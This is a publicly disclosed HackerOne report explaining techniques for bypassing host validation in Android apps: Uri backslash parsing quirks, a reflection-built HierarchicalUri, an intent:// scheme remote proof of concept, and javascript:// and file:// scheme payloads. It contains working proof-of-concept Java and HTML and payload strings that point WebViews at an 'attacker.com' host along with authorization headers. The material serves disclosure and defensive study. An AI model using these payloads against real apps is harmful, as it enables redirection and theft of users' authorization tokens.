{"id":431002,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MzEwMDI=","url":"https://hackerone.com/reports/431002","title":"Golden techniques to bypass host validations in Android apps","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2018-10-30T17:38:29.617Z","submitted_at":"2018-10-30T17:38:29.617Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bagipro","url":"/bagipro","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":31807,"url":"https://hackerone.com/redact","handle":"redact","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"profile":{"name":"██████","twitter_handle":"","website":"","about":"██████ "}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-10-30T19:35:37.364Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Guys, there is an amazing Russian word \"zaheck\" which is a synonym to vulnerability, trick, vector or attack. You need to begin using it to make us happy!","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":251,"voters":["mathec","irek","overjt","zzero","8ayac","sebch","ikuamike","samengmg","dee-see","europa","and 241 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3556758,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2018-10-30T17:38:29.617Z","updated_at":"2018-10-30T17:38:29.617Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bagipro","url":"/bagipro"},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3556839,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-10-30T19:35:37.408Z","updated_at":"2018-10-30T19:35:37.408Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":11359,"category":"researcher","content":"# #1 Backslash tricks\nLook at a typical host validation\n```java\nUri uri = Uri.parse(attackerControlledString);\nif(\"legitimate.com\".equals(uri.getHost() || uri.getHost().endsWith(\".legitimate.com\")) {\n    webView.loadUrl(attackerControlledString, getAuthorizationHeaders()); // or webView.loadUrl(uri.toString())\n}\n```\n\nThere is a problem in ``` android.net.Uri ``` and ``` java.net.URL ``` parsers. They don't recognize backslashes in authority part (``` java.net.URI ``` will show an exception for that). If you test \n```java\nString url = \"http://attacker.com\\\\\\\\@legitimate.com/smth\";\nLog.d(\"Wow\", Uri.parse(url).getHost()); // legitimate.com is printed!\nwebView.loadUrl(url, getAuthorizationHeaders()); // attacker.com is loaded :P\n```\n\n# #2 Reflection\nHere is an example of a super-secure URL validation:\n```java\nUri uri = getIntent().getData();\nboolean isOurDomain = \"https\".equals(uri.getScheme()) \u0026\u0026 uri.getUserInfo() == null \u0026\u0026 \"legitimate.com\".equals(uri.getHost());\nif(isOurDomain) {\n    webView.load(uri.toString(), getAuthorizationHeaders());\n}\n```\n\n``` android.net.Uri ``` is widely used on the Android platform, but if you look at the source code, you will notice that there is an abstract class with a few internal subclasses! I found that custom URI with arbitrary parts could be built using ``` android.net.Uri$HierarchicalUri ```. Got the point already?\nCode in ``` MainActivity.java ```:\n```java\npublic class MainActivity extends Activity {\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        Uri uri;\n        try {\n            Class partClass = Class.forName(\"android.net.Uri$Part\");\n            Constructor partConstructor = partClass.getDeclaredConstructors()[0];\n            partConstructor.setAccessible(true);\n\n            Class pathPartClass = Class.forName(\"android.net.Uri$PathPart\");\n            Constructor pathPartConstructor = pathPartClass.getDeclaredConstructors()[0];\n            pathPartConstructor.setAccessible(true);\n\n            Class hierarchicalUriClass = Class.forName(\"android.net.Uri$HierarchicalUri\");\n            Constructor hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()[0];\n            hierarchicalUriConstructor.setAccessible(true);\n\n            Object authority = partConstructor.newInstance(\"legitimate.com\", \"legitimate.com\");\n            Object path = pathPartConstructor.newInstance(\"@attacker.com\", \"@attacker.com\");\n            uri = (Uri) hierarchicalUriConstructor.newInstance(\"https\", authority, path, null, null);\n        }\n        catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n\n        Intent intent = new Intent();\n        intent.setData(uri);\n        intent.setClass(this, TestActivity.class);\n        startActivity(intent);\n    }\n}\n```\n\nCode in ``` TestActivity.java ```:\n```java\npublic class TestActivity extends Activity {\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        Uri uri = getIntent().getData();\n        Log.d(\"Wow\", \"Scheme: \" + uri.getScheme());\n        Log.d(\"Wow\", \"UserInfo: \" + uri.getUserInfo());\n        Log.d(\"Wow\", \"Host: \" + uri.getHost());\n        Log.d(\"Wow\", \"toString(): \" + uri.toString());\n    }\n}\n```\n\nIn my case it displays:\n```\n10-30 06:02:20.142 32044 32044 D Wow     : Scheme: https\n10-30 06:02:20.142 32044 32044 D Wow     : UserInfo: null\n10-30 06:02:20.142 32044 32044 D Wow     : Host: legitimate.com\n10-30 06:02:20.142 32044 32044 D Wow     : toString(): https://legitimate.com@attacker.com\n```\n\nIt happens because apps parse URI only once, and a victim app doesn't parse it again, but trusts to \"already parsed\" URI received from untrusted sources\n\n# #3 Remote technique for #1\nAs you know, apps can automatically handle external links from browsers/messengers. This can be done by registering a special ``` intent-filter ```\n```xml\n\t\u003cactivity android:name=\".DeeplinkActivity\"\u003e\n\t    \u003cintent-filter android:autoVerify=\"true\"\u003e\n\t        \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n\t        \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n\t        \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n\t        \u003cdata android:scheme=\"https\" android:host=\"legitimate.com\"/\u003e\n\t    \u003c/intent-filter\u003e\n\t\u003c/activity\u003e\n```\nAt this step you've already verified that you can attack that from third-party apps/ADB. If you try to create a remote PoC both to match the filter (remember that Android also uses ``` parsedIntent.getData().getHost() ``` to match with values defined in intent-filters) and triggers the bug\n```html\n\u003ca href=\"https://attacker.com\\\\@legitimate.com/\"\u003eBegin zaheck!\u003c/a\u003e\n```\nor\n\n```html\n\u003ca href=\"https://attacker.com%5C%5C@legitimate.com/\"\u003eBegin zaheck!\u003c/a\u003e\n```\nyou will notice that in the first example all ``` \\ ``` will be replaced with ``` / ```, in the second they will be kept encoded and the backslash trick won't work. But after careful research how ``` intent:// ``` scheme uries work I found a way to exploit it remotely. Intro: https://www.mbsd.jp/Whitepaper/IntentScheme.pdf\n\nAll backslashes could be saved in unchanged state in e.g. hash part of a URI right here https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6334\n\nPoC:\n```html\n\u003ca href=\"intent://not_used/#Intent;scheme=https://attacker.com\\\\@legitimate.com/;end\"\u003eBegin zaheck!\u003c/a\u003e\n```\nHere https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6436 it will be equal to\n```java\nUri.parse(\"https://attacker.com\\\\\\\\@legitimate.com/://not_used/\")\n```\nAnd the attack becomes remote!\n\n# #4 Missing scheme validation\nIn case if only the host value is validated, but the scheme isn't validated, you can use the following payloads with ``` javascript:// ``` and ``` file:// ``` scheme\n```\njavascript://legitimate.com/%0aalert(1)//\n```\nor\n```\nfile://legitimate.com/sdcard/payload.html\n```\n","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":52239,"username":"bagipro","name":"Sergey Toshin","bio":"","cleared":true,"website":"https://oversecured.com/","location":"","created_at":"2016-01-21T22:43:16.784Z","url":"https://hackerone.com/bagipro","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}